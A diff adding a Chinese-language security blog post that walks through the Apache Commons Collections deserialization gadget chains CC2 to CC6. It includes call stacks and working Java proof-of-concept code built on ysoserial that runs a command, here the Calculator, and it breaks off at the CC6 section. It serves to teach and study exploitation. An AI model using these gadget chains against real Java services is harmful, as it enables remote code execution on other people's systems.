@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="wk" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      CommonCollections2-7利用链分析 
+      
+      
+      |
+    
+     wEik1&#39;blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/avatar4.png">
+    <link rel="icon" href="/images/avatar4.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="wEik1'blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar4.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">wEik1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">CommonCollections2-7利用链分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-03-02 13:22:26
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                    <b>#</b> JAVA安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                    <b>#</b> JAVA安全
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">
+                    <b>#</b> 反序列化
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/CommonCollections/" title="CommonCollections">
+                    <b>#</b> CommonCollections
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="CommonCollections2"><a href="#CommonCollections2" class="headerlink" title="CommonCollections2"></a>CommonCollections2</h1><p><code>commons-collections4.0</code></p>
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p> 先看 ysoserial 的 Gadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">   PriorityQueue.readObject()</span><br><span class="line">      ...</span><br><span class="line">         TransformingComparator.compare()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">               Method.invoke()</span><br><span class="line">                  Runtime.exec()</span><br></pre></td></tr></table></figure>
+<p>与 cb1 链类似，利用 PriorityQueue 反序列化的时候会对队列中的元素使用比较器的 compare 方法即 comparator.compare() 去处理。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302141409482.png" alt="image-20210302141409482"></p>
+<p>cc2 链使用的比较器是 TransformingComparator，直接看 TransformingComparator.compare()</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302141604737.png" alt="image-20210302141604737"></p>
+<p>在比较前会用自身 transformer 的 transform 方法处理 queue 中的值，TransformingComparator.transformer 为InvokerTransformer ，继续看 InvokerTransformer 的 transform() 方法。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302142138615.png" alt="image-20210302142138615"></p>
+<p>利用反射调用对象 input 的任意方法，方法名为自身的 this.iMethodName 属性，参数啥的也都是自身属性。</p>
+<p>分析到这应该就明白 cc2 链是如何执行命令的了，只要找到一个能够执行命令的方法即可。ysoserial 用的是 TemplatesImpl，通过调用 TemplatesImpl 中的 newTransformer() 方法或者 getOutputProperties() 可以加载字节码执行命令。具体可以看 <a target="_blank" rel="noopener" href="https://blog.weik1.top/2021/01/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/">TemplatesImpl利用链分析</a></p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302142804183.png" alt="image-20210302142804183"></p>
+<h2 id="总结一下："><a href="#总结一下：" class="headerlink" title="总结一下："></a>总结一下：</h2><p>自己写代码实现一下整条链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 直接用 ysoserial 的 Gadgets.createTemplatesImpl创建一个恶意 templates 类</span></span><br><span class="line">        String args1 = <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(args1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造 InvokerTransformer 设置 iMethodName 为 newTransformer 或者 getOutputProperties，参数类型和参数值根据调用的方法设置就行</span></span><br><span class="line">        InvokerTransformer invokerTransformer  = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构建 TransformingComparator 比较器设置  transformer 为我们构造的 invokerTransformer</span></span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(invokerTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 PriorityQueue</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, transformingComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//向里PriorityQueue添加构造的恶意 templates，触发比较，就不通过反序列化触发比较了</span></span><br><span class="line">        queue.add(templates);</span><br><span class="line">        queue.add(templates);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>触发比较后成功弹出计算器。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302145522382.png" alt="image-20210302145522382"></p>
+<p>用 getOutputProperties() 方法也是一样的，两个方法都是无参的，参数类型和参数值都设置成 null 就行</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302145739943.png" alt="image-20210302145739943"></p>
+<h1 id="CommonCollections3"><a href="#CommonCollections3" class="headerlink" title="CommonCollections3"></a>CommonCollections3</h1><p><code>commons-collections3.1</code>和CommonsCollection1一样，也是利用 AnnotationInvocationHandler` 动态代理机制触发，高版本的 jdk8 无法利用</p>
+<h2 id="利用链分析-1"><a href="#利用链分析-1" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>先看 ysoserial 是如何构造的。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302152620733.png" alt="image-20210302152620733"></p>
+<p>cc3 这条链基本一样，cc1 主要通过调用 ChainedTransformer 的 transform 方法，从而链式调用 Transformer 数组里元素的 transform 方法，最后通过 AnnotationInvocationHandler+LazyMap#get()  触发 ChainedTransformer 的 transform 方法，具体可以看 <a target="_blank" rel="noopener" href="https://blog.weik1.top/2021/01/26/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90">CommonCollections1链分析</a></p>
+<p>cc3 与 cc1 唯一的不同就是 Transformer 数组 </p>
+<p>CC1 是通过 InvokerTransformer#transform() 方法里的反射调用机制来执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">					String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">					&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">					</span><br><span class="line">new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">					Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">					null, new Object[0] &#125;),</span><br><span class="line">					</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;,new Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">new ConstantTransformer(1) </span><br></pre></td></tr></table></figure>
+
+
+<p>CC3 构造的  Transformer 数组如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">new InstantiateTransformer(</span><br><span class="line">						new Class[] &#123; Templates.class &#125;,</span><br><span class="line">						new Object[] &#123; templatesImpl &#125;</span><br></pre></td></tr></table></figure>
+<p>ConstantTransformer 的作用是包裹一个对象，在调用其 transform 方法时返回这个对象，这里返回的就是 TrAXFilter 类对象，然后作为 InstantiateTransformer#transform() 方法的参数。看 InstantiateTransformer 的 transform() 方法</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302154315855.png" alt="image-20210302154315855"></p>
+<p>调用 input 的 getConstructor() 方法，其作用是重载构造函数，接着通过 newInstance() 方法调用它的构造函数，这里就是调用 TrAXFilter 的构造函数，继续看 TrAXFilter 的构造函数</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302155208191.png" alt="image-20210302155208191"></p>
+<p>这里会调用 templates#newTransformer()  方法，看到这里应该明白 CC3 是如何执行命令的了，还是通过 TemplatesImpl 。TemplatesImpl 的 newTransformer() 方法可以加载字节码执行命令。</p>
+<h2 id="总结一下：-1"><a href="#总结一下：-1" class="headerlink" title="总结一下："></a>总结一下：</h2><p>InstantiateTransformer#transform() 方法 可以调用任意类的构造函数</p>
+<p>TrAXFilter 类的构造函数会调用 templates 的 newTransformer() 方法</p>
+<p>然后配合  ChainedTransformer 的 transform 方法的链式调用和 TemplatesImpl 利用链</p>
+<p>写代码实现一下整条链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 直接用 ysoserial 的 Gadgets.createTemplatesImpl创建一个恶意 templates 类</span></span><br><span class="line">        String args1 = <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>;</span><br><span class="line">        Object templatesImpl = Gadgets.createTemplatesImpl(args1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造 Transformer 数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="comment">// 参数类型为  TemplatesImpl ，值为构造的 templates</span></span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templatesImpl&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 后边与 CC1 一样</span></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例一个 AnnotationInvocationHandler 类</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 AnnotationInvocationHandler 的代理</span></span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在实例化一个 AnnotationInvocationHandler 包裹我们的代理对象 proxyMap</span></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302162126024.png" alt="image-20210302162126024"></p>
+<h1 id="CommonCollections4"><a href="#CommonCollections4" class="headerlink" title="CommonCollections4"></a>CommonCollections4</h1><p>commons-collections4.0</p>
+<h2 id="利用链分析-2"><a href="#利用链分析-2" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>CC4 其实就是 CC2 的前半段 + CC3 的后半段组合一下。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302162751915.png" alt="image-20210302162751915"></p>
+<h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>CC2 是通过 PriorityQueue 反序列化的时候会对队列中的元素使用比较器的 compare 方法即 TransformingComparator#compare() 去处理，在 TransformingComparator#compare() 中会调用 InvokerTransformer 的 transform 方法处理 queue 中的值。</p>
+<p>CC3 则是通过 AnnotationInvocationHandler+LazyMap#get()  触发 ChainedTransformer 的 transform 方法从而执行命令</p>
+<p>两个组合一下把 CC2 的 InvokerTransformer 替换成 CC3 里的ChainedTransformer 就得到 CC4 了</p>
+<h1 id="CommonCollections5"><a href="#CommonCollections5" class="headerlink" title="CommonCollections5"></a>CommonCollections5</h1><p><code>commons-collections3.1</code> 由 <code>BadAttributeValueExpException</code> 触发所以高版本的 jdk8 也可以利用，有SecurityManager 限制,在 jdk 8u76之后，需要没有设置security manager才能触发这条gadget</p>
+<h2 id="利用链分析-3"><a href="#利用链分析-3" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>在 CC1 中是通过 AnnotationInvocationHandler#invoke() 方法调用 lazyMap#get() 进而调用 ChainedTransformer#transform()，AnnotationInvocationHandler 类的 readObject 方法中并没有直接调用到 Map 的 get 方法，所以只能通过 java 动态代理机制去触发，而 CC5 就是找到了一个在 readObject 方法 中调用了  lazyMap#get()  的类。</p>
+<p>直接看后半部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line"></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">      Reflections.setAccessible(valfield);</span><br><span class="line">valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> val;</span><br></pre></td></tr></table></figure>
+<p>这个类就是 BadAttributeValueExpException</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 这段就是通过反射机制设置 val的 val 为 entry </span><br><span class="line">Field valfield &#x3D; val.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">        Reflections.setAccessible(valfield);</span><br><span class="line">		valfield.set(val, entry);</span><br></pre></td></tr></table></figure>
+<p>看 BadAttributeValueExpException 的 readobject 方法</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302175053634.png" alt="image-20210302175053634"></p>
+<p>在 BadAttributeValueExpException#readobject() 调用了 TiedMapEntry#toString() ，注意前面有个 if ，需要满足<code>System.getSecurityManager() == null</code>，也就是没有设置 SecurityManager,在 jdk 8u76之后，需要没有设置security manager才能触发这条gadget。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302175141956.png" alt="image-20210302175141956"></p>
+<p>在 TiedMapEntry#toString() 里调用了 TiedMapEntry#getValue()</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302175613232.png" alt="image-20210302175613232"></p>
+<p>最终在 TiedMapEntry#getValue() 方法里调用了 lazyMap#get() ，后面就是 CC1 链的内容了。</p>
+<h2 id="总结一下-1"><a href="#总结一下-1" class="headerlink" title="总结一下"></a>总结一下</h2><p>调用栈：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                	TiedMapEntry.getValue()</span><br><span class="line">                     LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="CommonCollections6"><a href="#CommonCollections6" class="headerlink" title="CommonCollections6"></a>CommonCollections6</h2><p><code>commons-collections3.1</code> 由 BadAttributeValueExpException 触发，比较通用的一个版本</p>
+<h2 id="利用链分析-4"><a href="#利用链分析-4" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>CC6 与CC5 一样都是对 CC1 的改进，CC5 是用 BadAttributeValueExpException#readobject 调用 TiedMapEntry#getValue() 从而调用 LazyMap#get()，而 CC6 换成了 HashSet</p>
+<p>ysoserial 里的 CC6 链做了很多优化，看起来很复杂，这是网上的简化版本。</p>
